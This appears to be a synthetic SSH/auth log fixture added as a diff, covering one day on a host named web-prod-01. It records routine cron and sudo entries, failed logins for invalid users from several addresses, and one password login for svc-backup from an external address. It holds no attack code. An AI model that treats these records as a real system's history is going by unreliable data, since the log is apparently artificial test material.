+Sep 28 13:30:12 web-prod-01 sshd[3830]: Accepted publickey for alice from 10.10.5.21 port 42578 ssh2: ED25519 SHA256:oD2tNVKBmYUZNKUzfH3d1q78YJJIRuiwDAfHOyjkTA1
+Sep 28 13:30:12 web-prod-01 sshd[3830]: pam_unix(sshd:session): session opened for user alice(uid=1000) by (uid=0)
+Sep 28 13:30:12 web-prod-01 systemd-logind[612]: New session 104 of user alice.
+Sep 28 13:31:40 web-prod-01 sudo:    alice : TTY=pts/0 ; PWD=/home/alice ; USER=root ; COMMAND=/usr/bin/journalctl -u nginx --since today
+Sep 28 13:31:40 web-prod-01 sudo: pam_unix(sudo:session): session opened for user root(uid=0) by alice(uid=1000)
+Sep 28 13:31:41 web-prod-01 sudo: pam_unix(sudo:session): session closed for user root
+Sep 28 14:17:01 web-prod-01 CRON[3971]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 14:17:02 web-prod-01 CRON[3971]: pam_unix(cron:session): session closed for user root
+Sep 28 14:27:10 web-prod-01 sshd[4001]: Accepted password for svc-backup from 198.51.100.61 port 48700 ssh2
+Sep 28 14:27:10 web-prod-01 sshd[4001]: pam_unix(sshd:session): session opened for user svc-backup(uid=1003) by (uid=0)
+Sep 28 14:27:10 web-prod-01 systemd-logind[612]: New session 105 of user svc-backup.
+Sep 28 15:17:01 web-prod-01 CRON[4151]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 15:17:02 web-prod-01 CRON[4151]: pam_unix(cron:session): session closed for user root
+Sep 28 16:03:29 web-prod-01 sshd[4290]: Invalid user test from 192.0.2.160 port 49328
+Sep 28 16:03:31 web-prod-01 sshd[4290]: Failed password for invalid user test from 192.0.2.160 port 49328 ssh2
+Sep 28 16:03:32 web-prod-01 sshd[4290]: Connection closed by invalid user test 192.0.2.160 port 49328 [preauth]
+Sep 28 16:17:01 web-prod-01 CRON[4331]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 16:17:02 web-prod-01 CRON[4331]: pam_unix(cron:session): session closed for user root
+Sep 28 17:17:01 web-prod-01 CRON[4511]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 17:17:02 web-prod-01 CRON[4511]: pam_unix(cron:session): session closed for user root
+Sep 28 18:17:01 web-prod-01 CRON[4691]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 18:17:02 web-prod-01 CRON[4691]: pam_unix(cron:session): session closed for user root
+Sep 28 19:17:01 web-prod-01 CRON[4871]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 19:17:02 web-prod-01 CRON[4871]: pam_unix(cron:session): session closed for user root
+Sep 28 20:17:01 web-prod-01 CRON[5051]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 20:17:02 web-prod-01 CRON[5051]: pam_unix(cron:session): session closed for user root
+Sep 28 21:17:01 web-prod-01 CRON[5231]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 21:17:02 web-prod-01 CRON[5231]: pam_unix(cron:session): session closed for user root
+Sep 28 21:48:50 web-prod-01 sshd[5326]: Invalid user user from 198.51.100.7 port 45985
+Sep 28 21:48:52 web-prod-01 sshd[5326]: Failed password for invalid user user from 198.51.100.7 port 45985 ssh2
+Sep 28 21:48:53 web-prod-01 sshd[5326]: Connection closed by invalid user user 198.51.100.7 port 45985 [preauth]
+Sep 28 21:49:49 web-prod-01 sshd[5329]: Invalid user user from 198.51.100.7 port 54517
+Sep 28 21:49:51 web-prod-01 sshd[5329]: Failed password for invalid user user from 198.51.100.7 port 54517 ssh2
+Sep 28 21:49:52 web-prod-01 sshd[5329]: Connection closed by invalid user user 198.51.100.7 port 54517 [preauth]
+Sep 28 22:17:01 web-prod-01 CRON[5411]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 22:17:02 web-prod-01 CRON[5411]: pam_unix(cron:session): session closed for user root
+Sep 28 23:12:05 web-prod-01 sshd[5576]: Invalid user support from 203.0.113.8 port 52247
+Sep 28 23:12:07 web-prod-01 sshd[5576]: Failed password for invalid user support from 203.0.113.8 port 52247 ssh2
+Sep 28 23:12:08 web-prod-01 sshd[5576]: Connection closed by invalid user support 203.0.113.8 port 52247 [preauth]
+Sep 28 23:12:40 web-prod-01 sshd[5578]: Invalid user support from 203.0.113.8 port 47871
+Sep 28 23:12:42 web-prod-01 sshd[5578]: Failed password for invalid user support from 203.0.113.8 port 47871 ssh2
+Sep 28 23:12:43 web-prod-01 sshd[5578]: Connection closed by invalid user support 203.0.113.8 port 47871 [preauth]
+Sep 28 23:17:01 web-prod-01 CRON[5591]: pam_unix(cron:session): session opened for user root(uid=0) by (uid=0)
+Sep 28 23:17:02 web-prod-01 CRON[5591]: pam_unix(cron:session): session closed for user root
